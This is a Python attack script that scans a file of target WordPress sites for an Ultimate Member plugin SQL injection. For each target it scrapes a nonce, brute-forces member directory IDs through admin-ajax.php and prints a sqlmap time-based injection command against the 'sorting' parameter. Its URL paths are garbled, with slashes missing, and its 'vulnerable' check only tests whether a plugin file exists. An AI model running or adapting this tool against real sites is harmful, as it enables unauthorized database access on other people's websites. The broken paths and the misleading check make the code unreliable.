import re
import sys
import urllib3
import hashlib
import requests
import argparse
from colorama import Fore, Style
from pystyle import Colors, Colorate

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOLD = '\033[1m'
RESET = '\033[0m'

ascii_art = '''
 ____   _    ____   ____   _  __   _    
| __ ) | |  / ___| | __ ) | |/ /  / \   
|  _ \ | | | |     |  _ \ | ' /  / _ \  
| |_) || | | |___  | |_) || . \ / ___ \ 
|____/ |_|  \____| |____/ |_|\_/_/   \_\

'''
print(Colorate.Vertical(Colors.green_to_white, ascii_art, 2))


def check_version(target, timeout=5):
    print(Style.RESET_ALL + f"{BOLD}{Fore.BLUE}[SCANNING ==>]{Fore.RESET} Checking site version for {Fore.YELLOW}{target}{Fore.RESET}:", end=' ')
    try:
        # Use a more robust version check (e.g., check for specific vulnerable files)
        response = requests.get(f"{target}wp-contentpluginsultimate-memberultimate-member.php", 
                                verify=False, timeout=timeout)
        if response.status_code == 200:
            print(Fore.GREEN + f"Vulnerable!")
            return True
        else:
            print(Fore.RED + f"Not Vulnerable!")
            return False
    except requests.exceptions.Timeout:
        print(Fore.RED + f"Timeout: Connection timed out.")
        return False
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
        return False


def get_nonce(target, timeout=5):
    print(Style.RESET_ALL + f"{BOLD}{Fore.BLUE}[SCANNING ==>]{Fore.RESET} Getting nonce for {Fore.YELLOW}{target}{Fore.RESET}:", end=' ')
    try:
        response = requests.get(f'{target}index.phpregister', verify=False, timeout=timeout)
        if response.status_code == 200:
            nonce = re.search(r'um_scripts\s*=\s*\{[^}]*"nonce":"([^"]+)"', response.text).groups()[0]
            print(Fore.GREEN + f"{nonce}")
            return nonce
        else:
            print(Fore.RED + f"Error: Could not retrieve nonce")
            return None
    except requests.exceptions.Timeout:
        print(Fore.RED + f"Timeout: Connection timed out.")
        return None
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
        return None


def get_directory_id(target, nonce, timeout=5):
    print(Style.RESET_ALL + f"{BOLD}{Fore.BLUE}[SCANNING ==>]{Fore.RESET} Searching for valid directory ID for {Fore.YELLOW}{target}{Fore.RESET}:", end=' ')
    # Avoid brute-forcing -  consider using alternative techniques to find the ID
    # e.g., analyzing network traffic or using a specific API endpoint
    for num in range(1, 100):
        id = hashlib.md5(str(num).encode()).hexdigest()[10:15]
        payload = {
            "action": "um_get_members",
            "nonce": nonce,
            "directory_id": id
        }

        response = requests.post(f'{target}wp-adminadmin-ajax.php', data=payload, verify=False, timeout=timeout)
        if response.status_code == 200:
            if '"success":true' in response.text:
                print(Fore.GREEN + f"{id}")
                return id
    print(Fore.RED + f'Error: Valid directory ID not found!')
    return None


def scan_target(target, timeout):
    print()
    print(Fore.BLUE + f"\t--- Scanning {Fore.YELLOW}{target}{Fore.RESET} ---")
    if check_version(target, timeout):
        nonce = get_nonce(target, timeout)
        if nonce:
            dir_id = get_directory_id(target, nonce, timeout)
            if dir_id:
                data = f'action=um_get_members&nonce={nonce}&directory_id={dir_id}&sorting=user_login'
                print()
                print(Fore.GREEN + f"Vulnerable! {target} Check it with SQL tools:")
                #  Provide guidance on safely using sqlmap but avoid directly executing commands 
                print(Fore.YELLOW + f"Run: sqlmap -u {target}wp-adminadmin-ajax.php --method POST --data \"{data}\" --dbms mysql --technique=T -p sorting")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ultimate Member Plugin Vulnerability Scanner")
    parser.add_argument('-f', '--file', help='FILE CONTAINING LIST OF TARGETS', required=True)
    parser.add_argument('-t', '--timeout', help='Connection timeout in seconds', type=int, default=5)

    args = parser.parse_args()

    with open(args.file, 'r') as file:
        urls = file.readlines()
        for url in urls:
            scan_target(url.strip(), args.timeout)
